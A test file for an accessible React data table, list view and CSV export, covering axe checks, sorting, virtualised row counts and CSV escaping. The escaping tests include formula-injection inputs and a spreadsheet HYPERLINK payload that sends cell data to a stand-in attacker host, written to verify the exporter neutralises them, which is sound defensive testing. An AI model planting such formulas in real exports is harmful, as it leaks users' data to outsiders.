/**
 * Table, list and CSV — TST-A11Y-002 · STEP-003.04.
 */

import { cleanup, render, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import axe from 'axe-core';
import { afterEach, describe, expect, it, vi } from 'vitest';

import { escapeCell, toCsv } from './csv';
import { DataList, DataTable, type TableColumn } from './table';

afterEach(cleanup);

async function axeViolations(container: HTMLElement) {
  const results = await axe.run(container, {
    runOnly: { type: 'tag', values: ['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa', 'wcag22aa'] },
  });
  return results.violations.map((v) => `${v.id}: ${v.help}`);
}

interface Scenario {
  id: string;
  name: string;
  cost: number;
  nights: number;
}

const SCENARIOS: Scenario[] = [
  { id: 'a', name: 'Coastal', cost: 820, nights: 5 },
  { id: 'b', name: 'Alpine', cost: 640, nights: 4 },
  { id: 'c', name: 'City', cost: 1100, nights: 6 },
];

const COLUMNS: TableColumn<Scenario>[] = [
  { key: 'name', header: 'Scenario', cell: (r) => r.name, sortable: true },
  { key: 'cost', header: 'Cost', cell: (r) => r.cost, value: (r) => r.cost, sortable: true },
  { key: 'nights', header: 'Nights', cell: (r) => r.nights, value: (r) => r.nights },
];

function table(props: Partial<React.ComponentProps<typeof DataTable<Scenario>>> = {}) {
  return (
    <DataTable
      caption="Scenario comparison"
      columns={COLUMNS}
      rows={SCENARIOS}
      rowKey={(r) => r.id}
      {...props}
    />
  );
}

// --- accessibility -----------------------------------------------------------

describe('axe', () => {
  it('table has zero AA violations', async () => {
    const { container } = render(table());
    expect(await axeViolations(container)).toEqual([]);
  });

  it('list has zero AA violations', async () => {
    const { container } = render(
      <DataList caption="Scenarios" columns={COLUMNS} rows={SCENARIOS} rowKey={(r) => r.id} />,
    );
    expect(await axeViolations(container)).toEqual([]);
  });

  it('empty table has zero AA violations', async () => {
    const { container } = render(table({ rows: [] }));
    expect(await axeViolations(container)).toEqual([]);
  });
});

describe('table semantics', () => {
  it('has a caption, not just a heading nearby', () => {
    // A <caption> is announced on entering the table; an <h2> above it is not.
    const { container } = render(table());
    expect(container.querySelector('caption')?.textContent).toContain('Scenario comparison');
  });

  it('marks column headers with scope="col"', () => {
    render(table());
    const headers = screen.getAllByRole('columnheader');
    // Without scope, a header is just bold text to a screen reader.
    for (const header of headers) expect(header.getAttribute('scope')).toBe('col');
  });

  it('makes the first cell of each row a row header', () => {
    render(table());
    const rowHeaders = screen.getAllByRole('rowheader');
    expect(rowHeaders).toHaveLength(SCENARIOS.length);
    expect(rowHeaders[0]?.getAttribute('scope')).toBe('row');
  });
});

// --- sorting -----------------------------------------------------------------

describe('sorting', () => {
  it('sorts ascending then descending on repeated activation', async () => {
    const user = userEvent.setup();
    render(table());
    const button = screen.getByRole('button', { name: 'Cost' });

    await user.click(button);
    let names = screen.getAllByRole('rowheader').map((c) => c.textContent);
    expect(names).toEqual(['Alpine', 'Coastal', 'City']);

    await user.click(button);
    names = screen.getAllByRole('rowheader').map((c) => c.textContent);
    expect(names).toEqual(['City', 'Coastal', 'Alpine']);
  });

  it('announces sort direction with aria-sort on the sorted column ONLY', async () => {
    const user = userEvent.setup();
    render(table());
    await user.click(screen.getByRole('button', { name: 'Cost' }));

    const headers = screen.getAllByRole('columnheader');
    const sorted = headers.filter((h) => h.hasAttribute('aria-sort'));
    // aria-sort="none" on every other column is noise announced on each cell.
    expect(sorted).toHaveLength(1);
    expect(sorted[0]?.textContent).toContain('Cost');
    expect(sorted[0]?.getAttribute('aria-sort')).toBe('ascending');
  });

  it('exposes sortable headers as buttons, reachable by keyboard', async () => {
    const user = userEvent.setup();
    render(table());
    await user.tab();
    expect(document.activeElement).toBe(screen.getByRole('button', { name: 'Scenario' }));
    await user.keyboard('{Enter}');
    expect(screen.getAllByRole('rowheader')[0]?.textContent).toBe('Alpine');
  });

  it('leaves non-sortable columns as plain headers', () => {
    render(table());
    const nights = screen.getAllByRole('columnheader').find((h) => h.textContent === 'Nights');
    expect(within(nights as HTMLElement).queryByRole('button')).toBeNull();
  });
});

// --- virtualisation must not lie about size ---------------------------------

describe('virtualisation', () => {
  const many: Scenario[] = Array.from({ length: 10_000 }, (_, i) => ({
    id: String(i),
    name: `Scenario ${i}`,
    cost: i,
    nights: 3,
  }));

  it('reports the TRUE row count, not the rendered window', () => {
    // The failure this prevents: a screen reader announcing "row 3 of 20" for a
    // 10,000-row dataset, with no way for the user to discover otherwise.
    render(table({ rows: many, virtualWindow: { start: 0, count: 20 } }));
    const grid = screen.getByRole('table');
    // +1 for the header row.
    expect(grid.getAttribute('aria-rowcount')).toBe('10001');
    expect(screen.getAllByRole('rowheader')).toHaveLength(20);
  });

  it('gives each row its index within the WHOLE dataset', () => {
    render(table({ rows: many, virtualWindow: { start: 4000, count: 3 } }));
    const rows = screen.getAllByRole('row').slice(1); // drop the header row
    // Row 4,001 must announce itself as 4,001, not as 1.
    expect(rows[0]?.getAttribute('aria-rowindex')).toBe('4002');
    expect(rows[2]?.getAttribute('aria-rowindex')).toBe('4004');
  });

  it('states how many of how many are shown', () => {
    const { container } = render(table({ rows: many, virtualWindow: { start: 0, count: 20 } }));
    expect(container.querySelector('caption')?.textContent).toContain('Showing 20 of 10000 rows');
  });

  it('passes axe while virtualised', async () => {
    const { container } = render(table({ rows: many, virtualWindow: { start: 100, count: 10 } }));
    expect(await axeViolations(container)).toEqual([]);
  });
});

// --- CSV ---------------------------------------------------------------------

describe('CSV escaping', () => {
  it('quotes cells containing the delimiter, quotes or newlines', () => {
    expect(escapeCell('a,b')).toBe('"a,b"');
    expect(escapeCell('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('leaves ordinary values alone', () => {
    expect(escapeCell('Coastal')).toBe('Coastal');
    expect(escapeCell(820)).toBe('820');
    expect(escapeCell(null)).toBe('');
    expect(escapeCell(undefined)).toBe('');
  });

  it('NEUTRALISES formula injection', () => {
    // A trip note beginning with = is executed by Excel, LibreOffice and Sheets
    // when a colleague opens the shared export. The attacker never touches our
    // servers — they type into a field we faithfully export.
    for (const dangerous of ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx']) {
      const escaped = escapeCell(dangerous);
      expect(
        escaped.startsWith("'") || escaped.startsWith('"\''),
        `${dangerous} not neutralised`,
      ).toBe(true);
    }
  });

  it('neutralises the exfiltration payload specifically', () => {
    const attack = '=HYPERLINK("https://evil.example/?d="&A1,"Click me")';
    const escaped = escapeCell(attack);
    // Quoted because it contains a comma AND prefixed because it is a formula.
    expect(escaped).toContain("'=HYPERLINK");
    expect(escaped.indexOf("'")).toBeLessThan(escaped.indexOf('=HYPERLINK'));
  });

  it('preserves the value while removing the execution', () => {
    // The user must still be able to read what was typed.
    expect(escapeCell('=1+1')).toContain('=1+1');
  });
});

describe('CSV serialisation', () => {
  const csvColumns = COLUMNS.map((c) => ({
    key: c.key,
    header: c.header,
    value: (r: Scenario) => (c.value ? c.value(r) : c.cell(r)),
  }));

  it('emits a header row and one row per record', () => {
    const csv = toCsv(SCENARIOS, csvColumns, { bom: false });
    const lines = csv.trimEnd().split('\r\n');
    expect(lines).toHaveLength(SCENARIOS.length + 1);
    expect(lines[0]).toBe('Scenario,Cost,Nights');
    expect(lines[1]).toBe('Coastal,820,5');
  });

  it('uses CRLF, per RFC 4180', () => {
    expect(toCsv(SCENARIOS, csvColumns, { bom: false })).toContain('\r\n');
  });

  it('prefixes a BOM by default so Excel does not mangle place names', () => {
    // Without it, "Kraków" becomes "KrakÃ³w" on Windows.
    expect(toCsv(SCENARIOS, csvColumns).startsWith('﻿')).toBe(true);
    expect(toCsv(SCENARIOS, csvColumns, { bom: false }).startsWith('﻿')).toBe(false);
  });

  it('honours an alternative delimiter', () => {
    const csv = toCsv(SCENARIOS, csvColumns, { bom: false, delimiter: ';' });
    expect(csv.split('\r\n')[0]).toBe('Scenario;Cost;Nights');
  });
});

describe('CSV export from the table', () => {
  it('exports the FULL dataset, not the rendered window', async () => {
    // Exporting only what is on screen hands the user a silently truncated file.
    const user = userEvent.setup();
    const captured: string[] = [];
    const createObjectURL = vi.fn(() => 'blob:x');
    vi.stubGlobal('URL', { createObjectURL, revokeObjectURL: vi.fn() });
    const originalBlob = globalThis.Blob;
    vi.stubGlobal(
      'Blob',
      class {
        constructor(parts: string[]) {
          captured.push(parts.join(''));
        }
      },
    );

    const many: Scenario[] = Array.from({ length: 500 }, (_, i) => ({
      id: String(i),
      name: `S${i}`,
      cost: i,
      nights: 2,
    }));
    render(table({ rows: many, virtualWindow: { start: 0, count: 10 } }));
    await user.click(screen.getByRole('button', { name: 'Download CSV' }));

    vi.stubGlobal('Blob', originalBlob);
    vi.unstubAllGlobals();

    expect(captured).toHaveLength(1);
    const lines = (captured[0] as string).trimEnd().split('\r\n');
    expect(lines.length, 'export was truncated to the rendered window').toBe(501);
  });
});

// --- the list conveys the same information ----------------------------------

describe('list alternative', () => {
  it('keeps every column header attached to its value', () => {
    // A responsive table that drops headers on small screens conveys strictly
    // less than the wide one, which REQ-A11Y-002 does not permit.
    const { container } = render(
      <DataList caption="Scenarios" columns={COLUMNS} rows={SCENARIOS} rowKey={(r) => r.id} />,
    );
    const terms = Array.from(container.querySelectorAll('dt')).map((t) => t.textContent);
    expect(new Set(terms)).toEqual(new Set(['Scenario', 'Cost', 'Nights']));
    expect(container.querySelectorAll('dd')).toHaveLength(SCENARIOS.length * COLUMNS.length);
  });

  it('conveys the same values as the table — TST-A11Y-002', () => {
    const { container: listBox } = render(
      <DataList caption="Scenarios" columns={COLUMNS} rows={SCENARIOS} rowKey={(r) => r.id} />,
    );
    const listText = listBox.textContent ?? '';
    for (const scenario of SCENARIOS) {
      expect(listText).toContain(scenario.name);
      expect(listText).toContain(String(scenario.cost));
      expect(listText).toContain(String(scenario.nights));
    }
  });

  it('is labelled so it is findable when navigating by region', () => {
    render(
      <DataList caption="Scenarios" columns={COLUMNS} rows={SCENARIOS} rowKey={(r) => r.id} />,
    );
    expect(screen.getByRole('region', { name: 'Scenarios' })).toBeDefined();
  });
});
